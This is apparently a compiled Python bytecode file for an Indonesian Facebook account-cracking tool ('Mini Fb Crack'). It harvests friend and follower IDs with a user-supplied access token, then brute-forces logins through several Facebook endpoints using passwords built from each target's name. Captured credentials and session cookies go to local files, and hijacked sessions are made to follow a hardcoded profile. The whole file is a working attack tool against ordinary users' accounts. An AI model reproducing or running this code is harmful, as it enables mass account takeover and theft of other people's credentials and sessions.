a
    XaXF  �                   @   s�  d dl Zd dlZd dlZd dlZd dlZd dlZd dlmZ	 d dl
mZ dad\aaag Zg ZdZdZdZd	Zd
ZdZdZdZdZdd� Zdd� Zdd� Zdd� ZG dd� d�Z dd� Z!e"dk�r�z:e#dd��$� Z%e�&e�'de%� ��j(�Z)e!e%e)d � W �n� e*�yP   e�+d � e,d!e� d"e� d#e� d"e� d$�	� e-d!e� d%e� d&��Z%z�e�&e�'de%� ��j(�d Z)e#dd'��.e%� e,d(e� d)e� d*e� d"e� d+�	� e�/d,e%� �� e�/d-e%� �� e�/d.e%� �� e�/d/e%� �� e�/d0e%� �� e�/d1e%� �� e�0d2� e!e%e)� W n6 e1�yJ   e2d!e� d3e� d4e� d3e� d5�	� Y n0 Y n@ e1�y�   e�+d6� e2d!e� d3e� d4e� d3e� d5�	� Y n0 dS )7�    N)�BeautifulSoup)�ThreadPoolExecutor� )r   r   r   ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9zhttps://mbasic.facebook.comz[37;1mz[1;33mz[31;1mz[32;1mz[0;36mz[1;34mz[36;1mc           	      C   sH  t dd��� }i }t�� }|j�ddddd|dd	d
d�	� t|jdd|id�jd�}g d�}|d�D ]D}z2|�d�|v r�|�|�d�|�d�i� nW qdW qd   Y qd0 qd|�| |dddddddddd�� |j	d|d�}d|j
�� �� v �rtd7 ad| |d�|j
�� �d�S d|j
�� �� v �r8td7 ad| |d �S d!| |d �S d S )"N�ua�r�mbasic.facebook.com�	max-age=0�1�!application/x-www-form-urlencoded�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8�:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflatezid-ID,en-US;q=0.9)	�Host�cache-control�upgrade-insecure-requests�content-type�accept�
user-agent�referer�accept-encoding�accept-languagez7https://mbasic.facebook.com/login/?next&ref=dbl&refid=8r   ��headers�html.parser)�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�login�input�name�valuer   Zfalse�true)�email�passZprefill_contact_pointZprefill_sourceZprefill_typeZfirst_prefill_sourceZfirst_prefill_typeZhad_cp_prefilledZhad_password_prefilledZis_smart_lockZ_fb_noscriptzyhttps://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8��data�c_user�   �ok)�status�user�pw�cookie�
checkpoint�cp�r,   r-   r.   �error)�open�read�req�Sessionr   �update�parser�get�text�post�cookies�get_dict�keysr+   �joinr1   )	r-   r.   �kntlr(   �ses�a�b�c�d� rG   �/sdcard/cow2.py�crack   s(     *"rI   c              
   C   s�   t dd��� }t�� }tt�dd��tt�dd��tt�dd��dd|d	d
d�}ddd| d|dddd�	}d}|j|||d�}d|jv s�d|jv r�d| |d�S d|�	� d v r�d| |d�S d| |d�S d S )Nr   r   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr
   ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer   r   zx-fb-http-enginez/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�json�2�en_USZiosr	   Z 3f555f99fb61fcd7aa0c44f58f522ef6)	Zaccess_token�formatZsdk_versionr%   �locale�passwordZsdkZgenerate_session_cookiesZsigz,https://b-api.facebook.com/method/auth.login)�paramsr   Zsession_keyZEAAAr+   r2   zwww.facebook.comZ	error_msgr1   r3   )
r4   r5   r6   r7   �str�randomZrandintr:   r;   rJ   )r-   r.   rA   rB   �headerZparamZapiZresponserG   rG   rH   �crack21   s8    ��	rT   c                 C   s�  �z�t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t|jd�}d�	t
�d|j��}i }|d�D ]~}|�d�d u r�|�d�dkr�|�d| i� q�|�d�dkr�|�d|i� q�|�|�d�di� ql|�|�d�|�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j}	dt|j�� �� �v �r\d| |d�	|j�� �d�W S dt|j�� �� �v �r�d| |d�W S d | |d�W S W n: t�y� }
 z td!|
� d"�dd#� W Y d }
~
n
d }
~
0 0 d S )$Nr   r   r   r   r	   r   r   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)r   r   r   r   r   r   r   zhttps://mbasic.facebook.com/r   r   zdtsg":\{"token":"(.*?)"r!   r#   r"   r%   r&   �0rF   )�fb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassr   r   z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r'   r)   r+   )r,   r-   r.   r=   r0   r1   r2   r3   �   [×] ERROR : �                     			
��end)r4   r5   r6   r7   r   r8   r:   r9   r;   r@   �re�findallr<   �listr=   r>   r?   �	Exception�print)r-   r.   r   rB   �prD   �metar(   �iZpo�erG   rG   rH   �crack3N   s:    

��re   c                 C   s\  t �� }|j�dddtdddddd	d
dtd ddd�� i }t|jtd dtid�jd�}|�	dddi�}g d�}|�
d�D ]0}|�d�|v r||�|�d�|�d�i� q|q|q||�| |d�� z&t|jt|�d� |dd�jd�}	W n  tjj�y   td� Y n0 d|jv �r\td 8 atd 7 atd!t� d"| � d#|� d#d$�|j�� �� d%t� �
d$d&� �n�d'|jv �r�|	�	d�}
|
�	ddd(i�d }|
�	ddd)i�d }|
�	ddd*i�d }||||d$d+|d,�}t|jt|
d  |d-�jd�}d.d/� |�
d0�D �}tt|��d1k�rftd 8 atd 7 atd2d3��| d4 | d4 | d5 � td!t� d"| � d#|� d#|� d%t� �
d$d&� nttd!t� d6| � d#|� d#|� t� d7�
d$d&� tt|��D ]0}td!d8d9t|d  � d: ||  d;d$d&� �q�td!d$d&� n|d<t|	�v �r"td!t� d6| � d#|� d#|� t� d7�
d$d&� td!d$d&� n6td!t� d6| � d#|� d#|� t� d7�
d$d&� td!d$d&� d S )=Nr   r   r	   r
   Zchromez|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZnavigatez?1Zdocumentz/login/?next&ref=dbl&fl&refid=8r   rU   )r   r   r   �originr   r   r   zx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-destr   r   r   r   r   r   �form�methodr<   )r   r   r   r   r   r   r    Zbi_xrwhr!   r"   r#   )r%   r&   �actionT)r(   Zallow_redirectsz[!] Redirect overloadr)   r*   �z[OK] ONETAP � | r   z														rZ   r0   rW   r   �nhZ	Lanjutkan)rW   rW   r   r   Zcheckpoint_datazsubmit[Continue]rl   r'   c                 S   s   g | ]
}|j �qS rG   )r;   )�.0ZyyrG   rG   rH   �
<listcomp>�   �    zcheck_in.<locals>.<listcomp>�optionrV   r+   �w� �
z[CP] zV                                                                                      z   �[�] z					            	Zlogin_error)r6   r7   r   r8   �mbr9   r:   r   r;   �find�find_allr<   r   �
exceptionsZTooManyRedirectsr`   r=   r1   r+   �ijor@   r>   �putihrQ   �lenr4   �write�kuning�range)r-   Zpasw�ttlrB   r(   ZgedZfmr^   rc   �runrg   ZdtsgZjzstrl   ZdataDZxnxxZngew�optrG   rG   rH   �check_ino   s�    �&:
�	$,*.**r�   c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
�kondisic                 C   s
   || _ d S )N)�token)�selfr�   rG   rG   rH   �__init__�   s    zkondisi.__init__c                 C   s�  t |kr|a td7 a�z�|D �]�}t||�}|�d�dkr�td7 atdd��|�d�d |�d� d � td	|�d�� d
|�d�� d�dd�  �q�n�|�d�dk�rDtd7 az.t	�
t�d|�d�� d| j� ��j�d }W n ty�   d}Y n0 tdd��|�d�d |�d� d | d � t|�d�|�d�|�  �q�tdt� dt� dtt�� dttt��� dt� tt�� t� dt� tt�� t� dt� |� t� d�dd� qW n: t�y� } z td|� d�dd� W Y d }~n
d }~0 0 d S )Nr*   r,   r+   rC   r-   rr   r.   rs   �[32;1m[OK] rk   z2[37;1m                                          
r   rZ   r1   �https://graph.facebook.com/�?access_token=�birthday�-�[�=�
] CRACK:-[�/�
] OK/CP:-[ru   �	rX   rY   )�ajg�cotrT   r:   r+   r4   r}   r`   r1   rJ   �loadsr6   r�   r;   �KeyErrorr�   �biruLr{   rQ   r|   �idrz   r~   �merahr_   )r�   r-   �ajr.   �logikar�   rd   rG   rG   rH   �kondisi_api�   s*    

(&.0jzkondisi.kondisi_apic           
      C   sf  t |kr|a td7 a�z|D �]}t||�}|�d�dk�rtdd��|�d�d |�d� d � td	|�d�� d
|�d�� d
d�|�d��� d�dd� dd�|�d��i}tt	jt
d |d�jd�}|�d�D ]:}dt|�v r� �qq�dt|�v r�t	jt
|d  |d� q� �q$n�|�d�dk�r�z.t�t	�d|�d�� d| j� ��j�d }W n t�yn   d}Y n0 tdd��|�d�d |�d� d | d � t|�d�|�d�|�  �q$tdt� dt� dtt�� dttt��� dt� tt�� t� dt� tt�� t� dt� |� t� d �dd� qW n: t�y` }	 z td!|	� d"�dd� W Y d }	~	n
d }	~	0 0 d S )#Nr*   r,   r+   rC   r-   rr   r.   rs   r�   rk   r   r/   �2                                          [37;1m
rZ   �/100031928966181�r=   r   �Berhenti mengikuti�Ikuti�hrefr1   r�   r�   r�   r�   r�   r�   r�   r�   r�   ru   r�   rX   rY   )r�   r�   rI   r:   r4   r}   r`   r@   r9   r6   rv   r;   rx   rQ   rJ   r�   r�   r�   r�   r�   r{   r|   r�   rz   r+   r~   r1   r�   r_   �
r�   r-   r�   r.   r�   Zcokir   Zfllowr�   rd   rG   rG   rH   �kondisi_mbasic�   s4    

(8.0jzkondisi.kondisi_mbasicc           
      C   sj  t |kr|a td7 a�z|D �]}t||�}|�d�dk�rtd7 atdd��|�d�d |�d� d � td	|�d�� d
|�d�� d
|�d�� d�dd� d|�d�i}tt	jt
d |d�jd�}|�d�D ]:}dt|�v r� �qq�dt|�v r�t	jt
|d  |d� q� �q(n�|�d�dk�r�td7 az.t�t	�d|�d�� d| j� ��j�d }W n t�yr   d}Y n0 tdd��|�d�d |�d� d | d � t|�d�|�d�|�  �q(tdt� dt� dtt�� dttt��� dt� tt�� t� dt� tt�� t� d t� |� t� d!�dd� qW n: t�yd }	 z td"|	� d#�dd� W Y d }	~	n
d }	~	0 0 d S )$Nr*   r,   r+   rC   r-   rr   r.   rs   r�   rk   r=   r�   r   rZ   r/   r�   r�   r   r�   r�   r�   r1   r�   r�   r�   r�   r�   r�   r�   r�   r�   ru   r�   rX   rY   )r�   r�   re   r:   r+   r4   r}   r`   r9   r6   rv   r;   rx   rQ   r1   rJ   r�   r�   r�   r�   r�   r{   r|   r�   rz   r~   r�   r_   r�   rG   rG   rH   �kondisi_mbasic2�   s8    

(2.0jzkondisi.kondisi_mbasic2N)�__name__�
__module__�__qualname__r�   r�   r�   r�   rG   rG   rG   rH   r�   �   s   r�   c              "   C   s|  t �d� td� tdt� dt� dt� dt� d�	� td|� �� tdt� d	t� d
t� d	t� dt� dt� dt� dt� dt� dt� d�� tdt� dt� d��}|dv �r"tdt� dt� dt� dt� dt� dt� d�� tdt� dt� d��}z@t�	t
�d|� d| � ��j�}tdt� dt� d|d � �� W n6 t�yb   tdt� dt� d t� dt� d�	� Y n0 zbt�	t
�d|� d!| � ��j�}|d" D ]6}t�|d# d$ |d �d%�d&  d$ |d  � �q�W n6 t�y�   tdt� dt� d't� dt� d�	� Y n0 tdt� dt� d(tt�� d)�� �n�|d*v �r�tdt� dt� dt� dt� d+t� dt� d�� tdt� dt� d��}z@t�	t
�d|� d| � ��j�}tdt� dt� d|d � �� W n6 t�y�   tdt� dt� d t� dt� d�	� Y n0 zbt�	t
�d|� d,| � ��j�}|d" D ]6}t�|d# d$ |d �d%�d&  d$ |d  � �qW n6 t�y�   tdt� dt� d't� dt� d�	� Y n0 tdt� dt� d(tt�� d)�� nl|d-v �rtd.� td/t� td0d1��� � t� d2t� td3d1��� � t� d4t� d5t� d6�� t �d� t| |� t�d7� tdt� d	t� d8t� d	t� dt� dt� d9t� d:t� d;t� dt� d9t� d<t� d=t� dt� d9t� d>t� d?�!� tdt� dt� d��}td.� |dv �r�td@dA���}tD ]�}	|	�d$�\}
}}tt|�� ��dBk�r�q�nntt|�� ��dCk�r2|�� |�� dD |�� dE |�� dF |dGdHg}n(|�� dD |�� dE |�� dF |dGdHg}|�t | �j!|
|� �q�W d   � n1 �s�0    Y  �n�|d*v �r�td@dA���}tD ]�}	|	�d$�\}
}}tt|�� ��dBk�r��q�nntt|�� ��dCk�r&|�� |�� dD |�� dE |�� dF |dGdHg}n(|�� dD |�� dE |�� dF |dGdHg}|�t | �j"|
|� �q�W d   � n1 �s|0    Y  n�|d-v �rxtd@dA���}tD ]�}	|	�d$�\}
}}tt|�� ��dBk�rҐq�nntt|�� ��dCk�r|�� |�� dD |�� dE |�� dF |dGdHg}n(|�� dD |�� dE |�� dF |dGdHg}|�t | �j#|
|� �q�W d   � n1 �sn0    Y  d S )IN�cleara�  
By [0;92mMuhamad Badru Wasih
[1;94m   __________  ___   ________ __    __________ 
[1;97m / ____/ __ \/   | / ____/ //_/   / ____/ __ )
[1;96m / /   / /_/ / /| |/ /   / ,<     / /_  / __  |
[1;96m/ /___/ _, _/ ___ / /___/ /| |   / __/ / /_/ / 
[1;96m\____/_/ |_/_/  |_\____/_/ |_|  /_/   /_____/  
      [1;92m   Mini Fb Crack Simpel Crack!
* [0;93mgithub.com/AkinXD [0;97m* [0;93

[1;93m rt   �!z$] NYALAKAN => MATIKAN MODE PESAWAT [�]r�   �
[z/\z] DUMP ID BERDASARKAN [z]
[�01z] DUMP FROM FRIENDS LIST
[�02z] DUMP FROM FOLLOWERS LIST
[�03z] CHECK HASIL CRACK
�?z] CHOSEE	: )r�   r	   z] Ketik z'me'z Untuk Daftar Temanmu [�+z] ID TARGET	: r�   r�   r�   z] NAMA TARGET	: r"   �   ×z] TARGET INVALID [z!/friends?limit=5000&access_token=r(   r�   �|rr   r   z]cCARI TARGET LAIN [z] JUMLAH ID	: rs   )r�   rK   z Untuk Daftar Followersmu [z%/subscribers?limit=5000&access_token=)r�   �3r   z[OK] :
r+   r   z	 
[CP] :
r1   z 
[ zENTER FOR BACK TO MENUz ]r*   z] PILIH METODE CRACK [z	] METODE zB-APIz! (fast) hasil banyak rawan spam
[z	MBASIC V1z (fast) hasil dikit
[z	MBASIC V2z! (low) hasil banyak [recomended]
�#   )�max_workers�   �   Z123Z1234Z12345ZanjingZ	bismillah)$�os�systemr`   �biruMr{   r�   r!   �birurJ   r�   r6   r:   r;   rz   r�   �exitr�   r�   �append�rsplitr|   r4   r5   r~   �dump�time�sleep�Bool�splitrQ   �lowerZsubmitr�   r�   r�   r�   )r�   Znama�lrc   Zcekr   �xZpiZkirimr�   �uidr"   Zlengkapr.   rG   rG   rH   r�     s�    

"F
."(86$
."(86"
F


j
0(<
0(:
0(r�   �__main__Zsaver   z+https://graph.facebook.com/me?access_token=r"   r�   rt   r�   z6] ANDA BELUM LOGIN HARAP MASUKAN ACCESSTOKEN DIBAWAH [z]
r�   z] MASUKAN TOKEN FACEBOOK	: rq   r�   u   ✓z] LOGIN BERHASIL
[z] HARAP TUNGGU SEBENTAR...zDhttps://graph.facebook.com/100006230836266/subscribers?access_token=z?https://graph.facebook.com/1011933821/subscribers?access_token=zDhttps://graph.facebook.com/100057958306450/subscribers?access_token=zDhttps://graph.facebook.com/100069672799769/subscribers?access_token=zDhttps://graph.facebook.com/100004018035398/subscribers?access_token=zDhttps://graph.facebook.com/100034433778381/subscribers?access_token=�   r�   z] TOKEN INVALID [r�   zrm -rf save)3Zrequestsr6   rJ   r�   r�   r\   rR   Zbs4r   r9   �concurrent.futuresr   r�   r�   r+   r1   r�   r�   Znampungr   rv   r{   r~   r�   rz   r�   r�   r�   rI   rT   re   r�   r�   r�   r�   r4   r5   r�   r�   r:   r;   r   �FileNotFoundErrorr�   r`   r!   r}   r<   r�   r�   r�   rG   rG   rG   rH   �<module>   s^   0
!G\Z

""
,
